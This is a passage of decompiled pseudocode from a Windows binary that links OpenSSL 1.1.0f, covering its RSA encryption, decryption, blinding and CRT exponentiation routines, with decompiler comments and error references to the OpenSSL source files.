      if ( (!a1 || (v11 = sub_140026F70(a1), (*v7 = v11) != 0i64))
        && (!a2 || (v12 = sub_140026F70(a2), (v7[1] = v12) != 0i64))
        && (v13 = sub_140026F70(a3), (v7[3] = v13) != 0i64) )
      {
        if ( (unsigned int)sub_140027070(a3, 4u) )
          sub_140027530(v7[3], 4);
        *((_DWORD *)v7 + 9) = -1;
        return v7;
      }
      else
      {
        sub_14004DEF0((_DWORD **)v7);
        return 0i64;
      }
    }
    else
    {
      sub_140024610(3, 102, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_blind.c", 43);
      sub_14001D930(v7);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(3, 102, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_blind.c", 37);
    return 0i64;
  }
}
// 14004E051: variable 'v3' is possibly undefined
// 14004E0CB: variable 'v10' is possibly undefined

//----- (000000014004E160) ----------------------------------------------------
__int64 __fastcall sub_14004E160(__int64 a1)
{
  __int64 result; // rax

  result = UserMathErrorFunction((struct _exception *)a1);
  *(_DWORD *)(a1 + 32) = result;
  return result;
}

//----- (000000014004E180) ----------------------------------------------------
__int64 __fastcall sub_14004E180(__int64 a1)
{
  return sub_140025CE0(*(_DWORD **)(a1 + 64));
}

//----- (000000014004E1A0) ----------------------------------------------------
__int64 __fastcall sub_14004E1A0(__int64 a1, int *a2)
{
  __int64 v3; // rcx
  unsigned int v5; // edi
  bool v6; // zf
  __int64 result; // rax

  v3 = *(_QWORD *)a1;
  v5 = 0;
  if ( v3 && *(_QWORD *)(a1 + 8) )
  {
    if ( *(_DWORD *)(a1 + 36) == -1 )
      *(_DWORD *)(a1 + 36) = 0;
    if ( ++*(_DWORD *)(a1 + 36) == 32 && *(_QWORD *)(a1 + 16) && (*(_BYTE *)(a1 + 40) & 2) == 0 )
    {
      v6 = sub_14004DD40((__int64 *)a1, 0i64, 0i64, a2, 0i64, 0i64) == 0i64;
    }
    else
    {
      if ( (*(_BYTE *)(a1 + 40) & 1) != 0 )
      {
LABEL_13:
        v5 = 1;
        goto LABEL_15;
      }
      if ( !(unsigned int)sub_140079710(v3, v3, v3, *(_QWORD *)(a1 + 24), a2) )
        goto LABEL_15;
      v6 = (unsigned int)sub_140079710(
                           *(_QWORD *)(a1 + 8),
                           *(_QWORD *)(a1 + 8),
                           *(_QWORD *)(a1 + 8),
                           *(_QWORD *)(a1 + 24),
                           a2) == 0;
    }
    if ( v6 )
      goto LABEL_15;
    goto LABEL_13;
  }
  sub_140024610(3, 103, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_blind.c", 99);
LABEL_15:
  result = v5;
  if ( *(_DWORD *)(a1 + 36) == 32 )
    *(_DWORD *)(a1 + 36) = 0;
  return result;
}

//----- (000000014004E2A0) ----------------------------------------------------
__int64 __fastcall sub_14004E2A0(unsigned int a1, const void *a2, _BYTE *a3, __int64 a4, int a5)
{
  size_t v8; // rsi
  unsigned int v9; // r15d
  _BYTE *v10; // rbp
  int *v12; // rax
  int *v13; // r14
  _QWORD *v14; // r13
  _BYTE *v15; // rax
  int v16; // eax
  int v17; // eax
  int v18; // ecx
  __int64 *v20; // [rsp+88h] [rbp+20h]

  LODWORD(v8) = 0;
  v9 = -1;
  v10 = 0i64;
  if ( (int)sub_140027260(*(_QWORD *)(a4 + 24)) > 0x4000 )
  {
    sub_140024610(4, 104, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 60);
    return 0xFFFFFFFFi64;
  }
  if ( (int)sub_140027600(*(__int64 **)(a4 + 24), *(__int64 **)(a4 + 32)) <= 0 )
  {
    sub_140024610(4, 104, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 65);
    return 0xFFFFFFFFi64;
  }
  if ( (int)sub_140027260(*(_QWORD *)(a4 + 24)) > 3072 && (int)sub_140027260(*(_QWORD *)(a4 + 32)) > 64 )
  {
    sub_140024610(4, 104, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 72);
    return 0xFFFFFFFFi64;
  }
  v12 = (int *)sub_140027CD0();
  v13 = v12;
  if ( v12 )
  {
    sub_140027D40(v12);
    v20 = sub_140027C40(v13);
    v14 = sub_140027C40(v13);
    v8 = (int)(sub_140027260(*(_QWORD *)(a4 + 24)) + 7) / 8;
    v15 = sub_14001D8E0(v8);
    v10 = v15;
    if ( v20 && v14 && v15 )
    {
      switch ( a5 )
      {
        case 1:
          v16 = sub_140080DF0(v15, v8, a2, a1);
          break;
        case 2:
          v16 = sub_140081290(v15, v8, a2, a1);
          break;
        case 3:
          v16 = sub_140081530(v15, v8, a2, a1);
          break;
        case 4:
          v16 = sub_14006C660(v15, v8, a2, a1, 0i64, 0);
          break;
        default:
          sub_140024610(4, 104, 118, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 103);
LABEL_33:
          sub_140027B60((__int64)v13);
          goto LABEL_34;
      }
      if ( v16 > 0 && sub_140026840(v10, v8, (__int64)v20) )
      {
        if ( (int)sub_140027600(v20, *(__int64 **)(a4 + 24)) < 0 )
        {
          if ( ((*(_BYTE *)(a4 + 100) & 2) == 0
             || sub_14003C690((__int64 *)(a4 + 104), *(_DWORD **)(a4 + 152), *(__int64 ***)(a4 + 24), v13))
            && (*(unsigned int (__fastcall **)(_QWORD *, __int64 *, _QWORD, _QWORD, int *, _QWORD))(*(_QWORD *)(a4 + 8)
                                                                                                  + 48i64))(
                 v14,
                 v20,
                 *(_QWORD *)(a4 + 32),
                 *(_QWORD *)(a4 + 24),
                 v13,
                 *(_QWORD *)(a4 + 104)) )
          {
            v17 = sub_140027260((__int64)v14);
            v18 = v8 - sub_1400269C0((__int64)v14, &a3[(int)v8 - (v17 + 7) / 8]);
            if ( v18 > 0 )
              memset(a3, 0, v18);
            v9 = v8;
          }
        }
        else
        {
          sub_140024610(4, 104, 132, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 115);
        }
      }
      goto LABEL_33;
    }
    sub_140024610(4, 104, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 85);
    goto LABEL_33;
  }
LABEL_34:
  sub_140027BE0((__int64)v13);
  sub_14001DA40(v10, (int)v8, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 0x8Eu);
  return v9;
}

//----- (000000014004E5C0) ----------------------------------------------------
__int64 __fastcall sub_14004E5C0(unsigned int a1, const void *a2, _BYTE *a3, __int64 a4, int a5)
{
  size_t v5; // rsi
  _BYTE *v7; // r13
  unsigned int v10; // ebp
  int *v11; // rax
  int *v12; // r14
  __int64 *v13; // r12
  _QWORD *v14; // rbp
  _BYTE *v15; // rax
  int v16; // eax
  __int64 v17; // rdi
  _QWORD *v18; // rax
  _DWORD *v19; // rax
  _DWORD *v20; // r15
  _DWORD *v21; // rcx
  int v22; // eax
  int v23; // eax
  int v24; // ecx
  int v26; // [rsp+20h] [rbp-58h]
  int v27; // [rsp+30h] [rbp-48h] BYREF
  _QWORD *v28; // [rsp+38h] [rbp-40h]
  __int64 v29; // [rsp+40h] [rbp-38h]

  LODWORD(v5) = 0;
  v7 = 0i64;
  v27 = 0;
  v28 = 0i64;
  v29 = 0i64;
  v10 = -1;
  v11 = (int *)sub_140027CD0();
  v12 = v11;
  if ( v11 )
  {
    sub_140027D40(v11);
    v13 = sub_140027C40(v12);
    v14 = sub_140027C40(v12);
    v5 = (int)(sub_140027260(*(_QWORD *)(a4 + 24)) + 7) / 8;
    v15 = sub_14001D8E0(v5);
    v7 = v15;
    if ( !v13 || !v14 || !v15 )
    {
      v26 = 246;
      goto LABEL_48;
    }
    switch ( a5 )
    {
      case 1:
        v16 = sub_140080D40(v15, v5, a2, a1);
        break;
      case 3:
        v16 = sub_140081530(v15, v5, a2, a1);
        break;
      case 5:
        v16 = sub_14006D010(v15, v5, a2, a1);
        break;
      default:
        sub_140024610(4, 102, 118, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 262);
        goto LABEL_49;
    }
    if ( v16 <= 0 || !sub_140026840(v7, v5, (__int64)v13) )
      goto LABEL_49;
    if ( (int)sub_140027600(v13, *(__int64 **)(a4 + 24)) >= 0 )
    {
      sub_140024610(4, 102, 132, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 274);
      goto LABEL_49;
    }
    if ( *(char *)(a4 + 100) >= 0 )
    {
      v29 = sub_14004F5D0(a4, &v27, v12);
      v17 = v29;
      if ( !v29 )
      {
        sub_140024610(4, 102, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 281);
        goto LABEL_49;
      }
      if ( v27 )
      {
        v18 = v28;
      }
      else
      {
        v18 = sub_140027C40(v12);
        v28 = v18;
        if ( !v18 )
        {
          v26 = 288;
LABEL_48:
          sub_140024610(4, 102, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", v26);
          goto LABEL_49;
        }
      }
      if ( !(unsigned int)sub_14004F550(v17, (__int64)v13, (__int64)v18, v12) )
        goto LABEL_49;
    }
    if ( (*(_BYTE *)(a4 + 100) & 0x20) != 0
      || *(_QWORD *)(a4 + 48)
      && *(_QWORD *)(a4 + 56)
      && *(_QWORD *)(a4 + 64)
      && *(_QWORD *)(a4 + 72)
      && *(_QWORD *)(a4 + 80) )
    {
      if ( !(*(unsigned int (__fastcall **)(_QWORD *, __int64 *, __int64, int *))(*(_QWORD *)(a4 + 8) + 40i64))(
              v14,
              v13,
              a4,
              v12) )
        goto LABEL_49;
    }
    else
    {
      v19 = sub_140027200();
      v20 = v19;
      if ( !v19 )
      {
        v26 = 304;
        goto LABEL_48;
      }
      sub_140027660((__int64)v19, *(_QWORD *)(a4 + 40), 4);
      if ( (*(_BYTE *)(a4 + 100) & 2) != 0
        && !sub_14003C690((__int64 *)(a4 + 104), *(_DWORD **)(a4 + 152), *(__int64 ***)(a4 + 24), v12) )
      {
        v21 = v20;
LABEL_35:
        sub_140026FF0(v21);
        goto LABEL_49;
      }
      v22 = (*(__int64 (__fastcall **)(_QWORD *, __int64 *, _DWORD *, _QWORD, int *, _QWORD))(*(_QWORD *)(a4 + 8) + 48i64))(
              v14,
              v13,
              v20,
              *(_QWORD *)(a4 + 24),
              v12,
              *(_QWORD *)(a4 + 104));
      v21 = v20;
      if ( !v22 )
        goto LABEL_35;
      sub_140026FF0(v20);
    }
    if ( !v29 || (unsigned int)sub_14004DF50((__int64)v14, (__int64)v28, v29, v12) )
    {
      if ( a5 == 5 )
      {
        sub_140041AC0((__int64)v13, *(_QWORD *)(a4 + 24), (__int64)v14);
        if ( (int)sub_140026AB0((__int64)v14, v13) > 0 )
          v14 = v13;
      }
      v23 = sub_140027260((__int64)v14);
      v24 = v5 - sub_1400269C0((__int64)v14, &a3[(int)v5 - (v23 + 7) / 8]);
      if ( v24 > 0 )
        memset(a3, 0, v24);
      v10 = v5;
      goto LABEL_50;
    }
LABEL_49:
    v10 = -1;
LABEL_50:
    sub_140027B60((__int64)v12);
  }
  sub_140027BE0((__int64)v12);
  sub_14001DA40(v7, (int)v5, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 0x160u);
  return v10;
}

//----- (000000014004E980) ----------------------------------------------------
__int64 __fastcall sub_14004E980(int a1, _BYTE *a2, void *a3, __int64 a4, int a5)
{
  size_t v5; // rsi
  char *v6; // r14
  unsigned int v9; // ebp
  int *v11; // rax
  int *v12; // r12
  __int64 *v13; // rdi
  _QWORD *v14; // r15
  char *v15; // rax
  int v16; // eax
  int v17; // eax

  LODWORD(v5) = 0;
  v6 = 0i64;
  v9 = -1;
  if ( (int)sub_140027260(*(_QWORD *)(a4 + 24)) > 0x4000 )
  {
    sub_140024610(4, 103, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 498);
    return 0xFFFFFFFFi64;
  }
  if ( (int)sub_140027600(*(__int64 **)(a4 + 24), *(__int64 **)(a4 + 32)) <= 0 )
  {
    sub_140024610(4, 103, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 503);
    return 0xFFFFFFFFi64;
  }
  if ( (int)sub_140027260(*(_QWORD *)(a4 + 24)) > 3072 && (int)sub_140027260(*(_QWORD *)(a4 + 32)) > 64 )
  {
    sub_140024610(4, 103, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 510);
    return 0xFFFFFFFFi64;
  }
  v11 = (int *)sub_140027CD0();
  v12 = v11;
  if ( v11 )
  {
    sub_140027D40(v11);
    v13 = sub_140027C40(v12);
    v14 = sub_140027C40(v12);
    v5 = (int)(sub_140027260(*(_QWORD *)(a4 + 24)) + 7) / 8;
    v15 = (char *)sub_14001D8E0(v5);
    v6 = v15;
    if ( !v13 || !v14 || !v15 )
    {
      sub_140024610(4, 103, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 523);
      goto LABEL_34;
    }
    if ( a1 <= (int)v5 )
    {
      if ( sub_140026840(a2, a1, (__int64)v13) )
      {
        if ( (int)sub_140027600(v13, *(__int64 **)(a4 + 24)) < 0 )
        {
          if ( (*(_BYTE *)(a4 + 100) & 2) != 0
            && !sub_14003C690((__int64 *)(a4 + 104), *(_DWORD **)(a4 + 152), *(__int64 ***)(a4 + 24), v12)
            || !(*(unsigned int (__fastcall **)(_QWORD *, __int64 *, _QWORD, _QWORD, int *, _QWORD))(*(_QWORD *)(a4 + 8) + 48i64))(
                  v14,
                  v13,
                  *(_QWORD *)(a4 + 32),
                  *(_QWORD *)(a4 + 24),
                  v12,
                  *(_QWORD *)(a4 + 104))
            || a5 == 5
            && (*(_BYTE *)sub_140021BD0((__int64)v14) & 0xF) != 12
            && !(unsigned int)sub_140041AC0((__int64)v14, *(_QWORD *)(a4 + 24), (__int64)v14) )
          {
            goto LABEL_34;
          }
          v16 = sub_1400269C0((__int64)v14, v6);
          switch ( a5 )
          {
            case 1:
              v17 = sub_140080EF0(a3, v5, v6, v16, v5);
              break;
            case 3:
              v17 = sub_1400815B0((char *)a3, v5, v6, v16);
              break;
            case 5:
              v17 = sub_14006D0D0(a3, (unsigned int)v5, v6, v16, v5);
              break;
            default:
              sub_140024610(4, 103, 118, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 572);
              goto LABEL_34;
          }
          v9 = v17;
          if ( v17 < 0 )
            sub_140024610(4, 103, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 576);
          goto LABEL_34;
        }
        sub_140024610(4, 103, 132, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 541);
      }
    }
    else
    {
      sub_140024610(4, 103, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 532);
    }
LABEL_34:
    sub_140027B60((__int64)v12);
  }
  sub_140027BE0((__int64)v12);
  sub_14001DA40(v6, (int)v5, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 0x246u);
  return v9;
}

//----- (000000014004ECB0) ----------------------------------------------------
__int64 __fastcall sub_14004ECB0(int a1, _BYTE *a2, void *a3, __int64 a4, int a5)
{
  size_t v6; // rdi
  _BYTE *v7; // r14
  __int64 v8; // r12
  unsigned int v9; // r15d
  int *v10; // rax
  int *v11; // rsi
  __int64 *v12; // r13
  _QWORD *v13; // rax
  __int64 v14; // rcx
  __int64 v15; // rbp
  _BYTE *v16; // rax
  _QWORD *v17; // rax
  _DWORD *v18; // rax
  _DWORD *v19; // rbp
  _DWORD *v20; // rcx
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v25; // [rsp+20h] [rbp-78h]
  int v26; // [rsp+40h] [rbp-58h] BYREF
  _QWORD *v27; // [rsp+48h] [rbp-50h]
  _QWORD *v28; // [rsp+50h] [rbp-48h]

  LODWORD(v6) = 0;
  v26 = 0;
  v7 = 0i64;
  v27 = 0i64;
  v8 = 0i64;
  v9 = -1;
  v10 = (int *)sub_140027CD0();
  v11 = v10;
  if ( v10 )
  {
    sub_140027D40(v10);
    v12 = sub_140027C40(v11);
    v13 = sub_140027C40(v11);
    v14 = *(_QWORD *)(a4 + 24);
    v15 = (__int64)v13;
    v28 = v13;
    v6 = (int)(sub_140027260(v14) + 7) / 8;
    v16 = sub_14001D8E0(v6);
    v7 = v16;
    if ( !v12 || !v15 || !v16 )
    {
      v25 = 381;
      goto LABEL_47;
    }
    if ( a1 > (int)v6 )
    {
      sub_140024610(4, 101, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 391);
LABEL_48:
      sub_140027B60((__int64)v11);
      goto LABEL_49;
    }
    if ( !sub_140026840(a2, a1, (__int64)v12) )
      goto LABEL_48;
    if ( (int)sub_140027600(v12, *(__int64 **)(a4 + 24)) >= 0 )
    {
      sub_140024610(4, 101, 132, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 401);
      goto LABEL_48;
    }
    if ( *(char *)(a4 + 100) >= 0 )
    {
      v8 = sub_14004F5D0(a4, &v26, v11);
      if ( !v8 )
      {
        sub_140024610(4, 101, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 408);
        goto LABEL_48;
      }
      if ( v26 )
      {
        v17 = v27;
      }
      else
      {
        v17 = sub_140027C40(v11);
        v27 = v17;
        if ( !v17 )
        {
          v25 = 415;
LABEL_47:
          sub_140024610(4, 101, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", v25);
          goto LABEL_48;
        }
      }
      if ( !(unsigned int)sub_14004F550(v8, (__int64)v12, (__int64)v17, v11) )
        goto LABEL_48;
    }
    if ( (*(_BYTE *)(a4 + 100) & 0x20) != 0
      || *(_QWORD *)(a4 + 48)
      && *(_QWORD *)(a4 + 56)
      && *(_QWORD *)(a4 + 64)
      && *(_QWORD *)(a4 + 72)
      && *(_QWORD *)(a4 + 80) )
    {
      if ( !(*(unsigned int (__fastcall **)(__int64, __int64 *, __int64, int *))(*(_QWORD *)(a4 + 8) + 40i64))(
              v15,
              v12,
              a4,
              v11) )
        goto LABEL_48;
    }
    else
    {
      v18 = sub_140027200();
      v19 = v18;
      if ( !v18 )
      {
        v25 = 432;
        goto LABEL_47;
      }
      sub_140027660((__int64)v18, *(_QWORD *)(a4 + 40), 4);
      if ( (*(_BYTE *)(a4 + 100) & 2) != 0
        && !sub_14003C690((__int64 *)(a4 + 104), *(_DWORD **)(a4 + 152), *(__int64 ***)(a4 + 24), v11) )
      {
        v20 = v19;
LABEL_29:
        sub_140026FF0(v20);
        goto LABEL_48;
      }
      v21 = (*(__int64 (__fastcall **)(_QWORD *, __int64 *, _DWORD *, _QWORD, int *, _QWORD))(*(_QWORD *)(a4 + 8) + 48i64))(
              v28,
              v12,
              v19,
              *(_QWORD *)(a4 + 24),
              v11,
              *(_QWORD *)(a4 + 104));
      v20 = v19;
      if ( !v21 )
        goto LABEL_29;
      sub_140026FF0(v19);
      v15 = (__int64)v28;
    }
    if ( v8 && !(unsigned int)sub_14004DF50(v15, (__int64)v27, v8, v11) )
      goto LABEL_48;
    v22 = sub_1400269C0(v15, v7);
    switch ( a5 )
    {
      case 1:
        v23 = sub_1400810A0(a3, v6, v7, v22, v6);
        break;
      case 2:
        v23 = sub_1400813A0(a3, v6, v7, v22, v6);
        break;
      case 3:
        v23 = sub_1400815B0((char *)a3, v6, v7, v22);
        break;
      case 4:
        v23 = sub_14006CA90(a3, v6, v7, v22, v6, 0i64, 0);
        break;
      default:
        sub_140024610(4, 101, 118, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 473);
        goto LABEL_48;
    }
    v9 = v23;
    if ( v23 < 0 )
      sub_140024610(4, 101, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 477);
    goto LABEL_48;
  }
LABEL_49:
  sub_140027BE0((__int64)v11);
  sub_14001DA40(v7, (int)v6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ossl.c", 0x1E3u);
  return v9;
}

//----- (000000014004F080) ----------------------------------------------------
__int64 __fastcall sub_14004F080(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  _QWORD *v7; // r12
  _QWORD *v8; // r13
  _QWORD *v9; // r15
  __int64 **v10; // r14
  __int64 **v11; // rax
  __int64 **v12; // rdi
  __int64 **v13; // rax
  __int64 **v14; // rax
  __int64 **v15; // r14
  __int64 **v16; // rcx
  int v17; // eax
  __int64 **v18; // rax
  __int64 **v19; // rdi
  int v20; // eax
  __int64 **v21; // rax
  __int64 **v22; // rdi
  int v23; // eax
  __int64 **v24; // rax
  __int64 **v25; // rdi
  int v26; // eax
  unsigned int v28; // [rsp+30h] [rbp-38h]

  v28 = 0;
  sub_140027D40(a4);
  v7 = sub_140027C40(a4);
  v8 = sub_140027C40(a4);
  v9 = sub_140027C40(a4);
  v10 = (__int64 **)sub_140027200();
  v11 = (__int64 **)sub_140027200();
  v12 = v11;
  if ( !v10
    || !v11
    || (sub_140027660((__int64)v10, *(_QWORD *)(a3 + 48), 4),
        sub_140027660((__int64)v12, *(_QWORD *)(a3 + 56), 4),
        (*(_BYTE *)(a3 + 100) & 4) != 0)
    && (!sub_14003C690((__int64 *)(a3 + 112), *(_DWORD **)(a3 + 152), v10, a4)
     || !sub_14003C690((__int64 *)(a3 + 120), *(_DWORD **)(a3 + 152), v12, a4)) )
  {
    sub_140026FF0(v10);
    goto LABEL_39;
  }
  sub_140026FF0(v10);
  sub_140026FF0(v12);
  if ( (*(_BYTE *)(a3 + 100) & 2) != 0
    && !sub_14003C690((__int64 *)(a3 + 104), *(_DWORD **)(a3 + 152), *(__int64 ***)(a3 + 24), a4) )
  {
    goto LABEL_41;
  }
  v13 = (__int64 **)sub_140027200();
  v12 = v13;
  if ( !v13 )
    goto LABEL_41;
  sub_140027660((__int64)v13, a2, 4);
  if ( !(unsigned int)sub_140041D70(0i64, (__int64)v7, (__int64)v12, *(_QWORD *)(a3 + 56), a4)
    || (v14 = (__int64 **)sub_140027200(), (v15 = v14) == 0i64) )
  {
LABEL_39:
    v16 = v12;
    goto LABEL_40;
  }
  sub_140027660((__int64)v14, *(_QWORD *)(a3 + 72), 4);
  if ( !(*(unsigned int (__fastcall **)(_QWORD *, _QWORD *, __int64 **, _QWORD, int *, _QWORD))(*(_QWORD *)(a3 + 8)
                                                                                              + 48i64))(
          v8,
          v7,
          v15,
          *(_QWORD *)(a3 + 56),
          a4,
          *(_QWORD *)(a3 + 120)) )
  {
    sub_140026FF0(v12);
    v16 = v15;
LABEL_40:
    sub_140026FF0(v16);
    goto LABEL_41;
  }
  sub_140026FF0(v15);
  v17 = sub_140041D70(0i64, (__int64)v7, (__int64)v12, *(_QWORD *)(a3 + 48), a4);
  v16 = v12;
  if ( !v17 )
    goto LABEL_40;
  sub_140026FF0(v12);
  v18 = (__int64 **)sub_140027200();
  v19 = v18;
  if ( v18 )
  {
    sub_140027660((__int64)v18, *(_QWORD *)(a3 + 64), 4);
    v20 = (*(__int64 (__fastcall **)(__int64, _QWORD *, __int64 **, _QWORD, int *, _QWORD))(*(_QWORD *)(a3 + 8) + 48i64))(
            a1,
            v7,
            v19,
            *(_QWORD *)(a3 + 48),
            a4,
            *(_QWORD *)(a3 + 112));
    v16 = v19;
    if ( !v20 )
      goto LABEL_40;
    sub_140026FF0(v19);
    if ( (unsigned int)sub_140041AC0(a1, a1, (__int64)v8)
      && (!sub_1400270E0(a1) || (unsigned int)sub_140041A10(a1, a1, *(_QWORD *)(a3 + 48))) )
    {
      if ( (unsigned int)sub_14006E5B0((__int64)v7, a1, *(_QWORD *)(a3 + 80), a4) )
      {
        v21 = (__int64 **)sub_140027200();
        v22 = v21;
        if ( v21 )
        {
          sub_140027660((__int64)v21, (__int64)v7, 4);
          v23 = sub_140041D70(0i64, a1, (__int64)v22, *(_QWORD *)(a3 + 48), a4);
          v16 = v22;
          if ( !v23 )
            goto LABEL_40;
          sub_140026FF0(v22);
          if ( (!sub_1400270E0(a1) || (unsigned int)sub_140041A10(a1, a1, *(_QWORD *)(a3 + 48)))
            && (unsigned int)sub_14006E5B0((__int64)v7, a1, *(_QWORD *)(a3 + 56), a4)
            && (unsigned int)sub_140041A10(a1, (__int64)v7, (__int64)v8) )
          {
            if ( !*(_QWORD *)(a3 + 32) || !*(_QWORD *)(a3 + 24) )
              goto LABEL_37;
            if ( !(*(unsigned int (__fastcall **)(_QWORD *, __int64))(*(_QWORD *)(a3 + 8) + 48i64))(v9, a1)
              || !(unsigned int)sub_140041AC0((__int64)v9, (__int64)v9, a2)
              || !(unsigned int)sub_140041D70(0i64, (__int64)v9, (__int64)v9, *(_QWORD *)(a3 + 24), a4)
              || sub_1400270E0((__int64)v9)
              && !(unsigned int)sub_140041A10((__int64)v9, (__int64)v9, *(_QWORD *)(a3 + 24)) )
            {
              goto LABEL_41;
            }
            if ( sub_140027160((__int64)v9) )
            {
LABEL_37:
              v28 = 1;
              goto LABEL_41;
            }
            v24 = (__int64 **)sub_140027200();
            v25 = v24;
            if ( v24 )
            {
              sub_140027660((__int64)v24, *(_QWORD *)(a3 + 40), 4);
              v26 = (*(__int64 (__fastcall **)(__int64, __int64, __int64 **, _QWORD, int *, _QWORD))(*(_QWORD *)(a3 + 8) + 48i64))(
                      a1,
                      a2,
                      v25,
                      *(_QWORD *)(a3 + 24),
                      a4,
                      *(_QWORD *)(a3 + 104));
              v16 = v25;
              if ( !v26 )
                goto LABEL_40;
              sub_140026FF0(v25);
              goto LABEL_37;
            }
          }
        }
      }
    }
  }
LABEL_41:
  sub_140027B60((__int64)a4);
  return v28;
}

//----- (000000014004F4F0) ----------------------------------------------------
__int64 __fastcall sub_14004F4F0(__int64 a1)
{
  *(_DWORD *)(a1 + 100) |= 6u;
  return 1i64;
}

//----- (000000014004F500) ----------------------------------------------------
__int64 __fastcall sub_14004F500(__int64 *a1)
{
  sub_14003C3A0(a1[13]);
  sub_14003C3A0(a1[14]);
  sub_14003C3A0(a1[15]);
  return 1i64;
}

//----- (000000014004F540) ----------------------------------------------------
char **sub_14004F540()
{
  return &off_140135570;
}
// 140135570: using guessed type char *off_140135570;

//----- (000000014004F550) ----------------------------------------------------
__int64 __fastcall sub_14004F550(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  unsigned int v9; // ebx

  if ( !a3 )
    return sub_14004DC70(a2, 0i64, a1, a4);
  sub_14004E000(a1);
  v9 = sub_14004DC70(a2, a3, a1, a4);
  sub_14004E180(a1);
  return v9;
}

//----- (000000014004F5D0) ----------------------------------------------------
__int64 __fastcall sub_14004F5D0(__int64 a1, _DWORD *a2, int *a3)
{
  __int64 v6; // rdi

  sub_140025D20(*(_DWORD **)(a1 + 152));
  if ( !*(_QWORD *)(a1 + 136) )
    *(_QWORD *)(a1 + 136) = sub_14005E380((_QWORD *)a1, a3);
  v6 = *(_QWORD *)(a1 + 136);
  if ( v6 )
  {
    if ( sub_14004DFD0(*(_QWORD *)(a1 + 136)) )
    {
      *a2 = 1;
    }
    else
    {
      *a2 = 0;
      if ( !*(_QWORD *)(a1 + 144) )
        *(_QWORD *)(a1 + 144) = sub_14005E380((_QWORD *)a1, a3);
      v6 = *(_QWORD *)(a1 + 144);
    }
  }
  sub_140025CE0(*(_DWORD **)(a1 + 152));
  return v6;
}

//----- (000000014004F690) ----------------------------------------------------
__int64 __fastcall sub_14004F690()
{
  int v0; // eax

  return sub_1400417E0(&qword_140143370, v0 - 39);
}
// 14004F69D: variable 'v0' is possibly undefined
// 14004F690: using guessed type __int64 __fastcall sub_14004F690();
// 140143370: using guessed type __int64 qword_140143370;

//----- (000000014004F6B0) ----------------------------------------------------
__int64 __fastcall sub_14004F6B0(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 16) )
    return sub_140041620(&qword_140143370, (__int64)sub_14004F750, a1, &dword_1400F7B9C, 1, 0);
  else
    return 1i64;
}
// 1400F7B9C: using guessed type int dword_1400F7B9C;
// 140143370: using guessed type __int64 qword_140143370;

//----- (000000014004F700) ----------------------------------------------------
__int64 __fastcall sub_14004F700(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 16) )
    return sub_140041620(&qword_140143370, (__int64)sub_14004F750, a1, &dword_1400F7B9C, 1, 1);
  else
    return 1i64;
}
// 1400F7B9C: using guessed type int dword_1400F7B9C;
// 140143370: using guessed type __int64 qword_140143370;

//----- (000000014004F750) ----------------------------------------------------
__int64 sub_14004F750()
{
  return sub_140041580(&qword_140143370);
}
// 140143370: using guessed type __int64 qword_140143370;

//----- (000000014004F770) ----------------------------------------------------
__int64 __fastcall sub_14004F770(__int64 a1)
{
  unsigned int v1; // r14d
  int v3; // ebp
  __int64 v4; // r12
  _DWORD *v5; // rsi
  _DWORD *v6; // rbx
  int *v7; // r15
  int v8; // eax
  _DWORD *v9; // rax
  _DWORD *v10; // rbp

  v1 = 0;
  v3 = 0;
  v4 = 0i64;
  v5 = 0i64;
  v6 = 0i64;
  v7 = (int *)sub_140027CD0();
  if ( !v7 )
    goto LABEL_21;
  v6 = *(_DWORD **)(a1 + 40);
  if ( !v6 )
  {
    v6 = sub_1400273B0();
    if ( !v6 )
      goto LABEL_21;
    v3 = 1;
  }
  v5 = *(_DWORD **)(a1 + 32);
